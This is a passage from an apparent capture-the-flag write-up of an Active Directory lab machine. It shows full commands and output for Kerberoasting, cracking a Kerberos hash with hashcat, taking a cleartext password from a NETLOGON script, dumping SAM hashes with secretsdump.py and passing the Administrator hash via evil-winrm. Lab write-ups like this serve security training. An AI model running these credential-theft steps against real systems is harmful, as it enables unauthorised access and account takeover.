</span></span><span style=display:flex><span>Impacket v0.10.0 - Copyright <span style=color:#ae81ff>2022</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
</span></span><span style=display:flex><span>----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
</span></span><span style=display:flex><span>CIFS/vulnnet-rst.local  enterprise-core-vn  CN<span style=color:#f92672>=</span>Remote Management Users,CN<span style=color:#f92672>=</span>Builtin,DC<span style=color:#f92672>=</span>vulnnet-rst,DC<span style=color:#f92672>=</span>local  2021-03-11 21:45:09.913979  2021-03-14 01:41:17.987528             
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> CCache file is not found. Skipping...
</span></span><span style=display:flex><span>$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b
</span></span></code></pre></div><p>We found the hash for the user <code>enterprise-core-vn</code>, which we can put in a file and crack it with <code>hashcat</code> on mode <code>13100</code>.</p><ul><li>Command: <code>hashcat -m 13100 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ hashcat -m <span style=color:#ae81ff>13100</span> -a <span style=color:#ae81ff>0</span> hash1.txt /usr/share/wordlists/rockyou.txt
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span><span style=display:flex><span>$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$5bc05b5e08a81cb226c6b23272df4e95$7f705c093630a21b08128de6dae88225bba2cae7589aefbf31098f167ed23d1f91dcaa2a6386c770b706278366fb6e02cf533172ea5777f90d1efaaac48f9045fc1fa792e2ca57eaf2d12c6fa86e30c7c2421fc7c98cf5ccc1a131563dd3af338467861ec715476354d49c310588a38b29df8217a99eba6168728b489807e72785850279bd1a51a15caca272cac5285396d0fd13c05f6c889408cacf2171b45af9c438f048c7ac35b89295f447e908d2df8e5f90761cdbb9ddf87c7ffb816ccae03fbc36fb0d6a80569047a4c6cc51a0d1cb7187d7e1288216bfcc94a25a7ac026ae6508207784da01e7c7660f339fe8bb7a88d68be95f5c0331d05cf34c56288c21df9d5e0f6d7b2aa566ba3891855ccaff60e26eda257b251421978119494e6597c493ea4b769f276d156ed729c768f71849c4cb03fb75ca861a0cb7bd226de2c3503a43aaecff8245d3566cc61784d285b3d9e7c051b63ef366ef810fda31e3ead5cd3de68c14ed0447db4b43c2eae2cfa8444335a1a12e8033d0fa4334b52278d1d4189950bb6b23afddec426e8da50d921ff7af781027577a82c36492f1da51375d906e1a7ee820888e516f407ed105eebd1741fba436b2cbc84bf6544c825d6ca6aca61e4bf2ad9828c3607aec0072efbeb674bd4ea39434ec7cc670f1932005703284fddd2a79173ffb44f29fb6cd829a329ccf3e8bdb6ea81a72606b74eee58519dc038ce9403321be7638f6bc2ddd1a6a317bea60bd3dbf897c8250d39c50056be9e1b0c3600f32252bed046c67ba849c55f0642c9b6565597003e77bfa97d3923232061d097e02c64286967b0356e6993800a46b237b14fbd60eb98415ed366cd79ba39c39eee92c6507a173bf4887314f818be716530d7f9ce15f97ed6c9fb01e20b75253abae72cdb316730f56c88652ac2657b764438f8caf7dadb94c78e3cbf4bcfd775436f14b6738b3e631af6e73e89eb0ae7aeee04c0b290c275b21f9cc4fb193fa90374d8bf214ea231b2d6db4c2a2281e1e5ef33070139172576c02542b3a4e58e503b995ea44f0a123da1c4d122ae2381974a0881568d9793e978587b1959925044e1e4d970bedcfe09f71e9837aca764214549ca77d8467113ab367001e4fed7402c5aa989cd9ca9bf4c27219b52c4b2d3a85c7f5d9ca6fa914c847ba7646eef11cd9fd0ee612e5815130f054e76f163d3d0e064e6285759df9e45df44534c05a8e3f8fe2c0925aaf9a689975288b6f6138d5f6b8dc9404767f7a0aa24afce821a0f146acf9b1856e15f0a000b727a47c35073d215e53e781f56d4f6218e43595b6bc70c4f58d4c92a2de03e81faf1fc6954e1dc8b3581dd2f1e5c5b4a091965736c554a3eb692561c24ee1fdcfbcd26a9d1b:ry<span style=color:#f92672>=</span>ibfkfv,s6h,
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>So, the cleartext password for <code>enterprise-core-vn</code> is <code>ry=ibfkfv,s6h,</code>.<br>We can login as <code>enterprise-core-vn</code> using <code>evil-winrm</code> and read the user flag.</p><ul><li>Command: <code>evil-winrm -i 10.10.232.200 -u enterprise-core-vn</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u enterprise-core-vn
</span></span><span style=display:flex><span>Enter Password: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Evil-WinRM shell v3.4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style=color:#f92672>()</span> <span style=color:#66d9ef>function</span> is unimplemented on this machine
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\e</span>nterprise-core-vn<span style=color:#ae81ff>\D</span>ocuments&gt; cd ../Desktop
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\e</span>nterprise-core-vn<span style=color:#ae81ff>\D</span>esktop&gt; type user.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\e</span>nterprise-core-vn<span style=color:#ae81ff>\D</span>esktop&gt;
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>Now we can access the <code>NETLOGON</code> share as the user <code>enterprise-core-vn</code> and see an interesting file <code>ResetPassword.vbs</code>, which we can download.</p><ul><li>Command: <code>smbclient \\\\10.10.232.200\\NETLOGON -U enterprise-core-vn</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ smbclient <span style=color:#ae81ff>\\\\</span>10.10.232.200<span style=color:#ae81ff>\\</span>NETLOGON -U enterprise-core-vn
</span></span><span style=display:flex><span>Password <span style=color:#66d9ef>for</span> <span style=color:#f92672>[</span>WORKGROUP<span style=color:#ae81ff>\e</span>nterprise-core-vn<span style=color:#f92672>]</span>:
</span></span><span style=display:flex><span>Try <span style=color:#e6db74>&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> prompt off
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> mget *
</span></span><span style=display:flex><span>getting file <span style=color:#ae81ff>\R</span>esetPassword.vbs of size <span style=color:#ae81ff>2821</span> as ResetPassword.vbs <span style=color:#f92672>(</span>2.3 KiloBytes/sec<span style=color:#f92672>)</span> <span style=color:#f92672>(</span>average 2.3 KiloBytes/sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>smb: <span style=color:#ae81ff>\&gt;</span> exit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ cat ResetPassword.vbs
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span><span style=display:flex><span>strUserNTName <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;a-whitehat&#34;</span>                                                                                                                     
</span></span><span style=display:flex><span>strPassword <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;bNdKVkjv3RR9ht&#34;</span>
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>So, we found the cleartext password <code>bNdKVkjv3RR9ht</code> of user <code>a-whitehat</code> inside the file <code>ResetPassword.vbs</code>.<br>Now we can use the script <code>secretsdump.py</code> from <code>impacket</code> in order to to dump secrets from the remote machine without executing any agent. Techniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and kerberos keys, and dumping NTDS.dit.</p><ul><li>Command: <code>/opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:'bNdKVkjv3RR9ht'@10.10.232.200</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ /opt/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:<span style=color:#e6db74>&#39;bNdKVkjv3RR9ht&#39;</span>@10.10.232.200
</span></span><span style=display:flex><span>Impacket v0.10.0 - Copyright <span style=color:#ae81ff>2022</span> SecureAuth Corporation
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping local SAM hashes <span style=color:#f92672>(</span>uid:rid:lmhash:nthash<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>&lt;snip&gt;
</span></span></code></pre></div><p>Now, we can login with the <code>nthash</code> of the <code>Administrator</code> user using <code>evil-winrm</code>.</p><ul><li>Command: <code>evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ evil-winrm -i 10.10.232.200 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
</span></span><span style=display:flex><span>vil-WinRM shell v3.4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span style=color:#f92672>()</span> <span style=color:#66d9ef>function</span> is unimplemented on this machine
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Info: Establishing connection to remote endpoint
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>ocuments&gt; cd ../Desktop
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop&gt; type system.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop&gt; whoami
</span></span><span style=display:flex><span>vulnnet-rst<span style=color:#ae81ff>\a</span>dministrator
</span></span><span style=display:flex><span>*Evil-WinRM* PS C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop&gt;
</span></span></code></pre></div><p>Now are the <code>Administrator</code> user and can read the system flag.</p><p>Proof of Concept (PoC image):
<img src=../../../thm/vulnnetroasted/vulnnetroasted.png alt="Olympus photo" style=width:700px;height:300px></p><ul class=post-tags><li><a href=https://geobour98.com/tags/windows/><strong>windows</strong></a></li><li><a href=https://geobour98.com/tags/active-directory/><strong>active-directory</strong></a><li><li><a href=https://geobour98.com/tags/smbmap/><strong>smbmap</strong></a></li><li><a href=https://geobour98.com/tags/smbclient/><strong>smbclient</strong></a></li><li><a href=https://geobour98.com/tags/impacket/><strong>impacket</strong></a><li><li><a href=https://geobour98.com/tags/lookupsid.py/><strong>lookupsid.py</strong></a></li><li><a href=https://geobour98.com/tags/asreproasting/><strong>asreproasting</strong></a></li><li><a href=https://geobour98.com/tags/getnpusers.py/><strong>getnpusers.py</strong></a></li><li><a href=https://geobour98.com/tags/hashcat/><strong>hashcat</strong></a></li><li><a href=https://geobour98.com/tags/kerberoasting/><strong>kerberoasting</strong></a></li><li><a href=https://geobour98.com/tags/getuserspns.py/><strong>getuserspns.py</strong></a></li><li><a href=https://geobour98.com/tags/evil-winrm/><strong>evil-winrm</strong></a></li><li><a href=https://geobour98.com/tags/secretsdump.py/><strong>secretsdump.py</strong></a></li></ul></div><footer class=post-footer></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://geobour98.com/>geobour98</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="copy";function s(){e.innerText="copied!",setTimeout(()=>{e.innerText="copy"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script></body></html>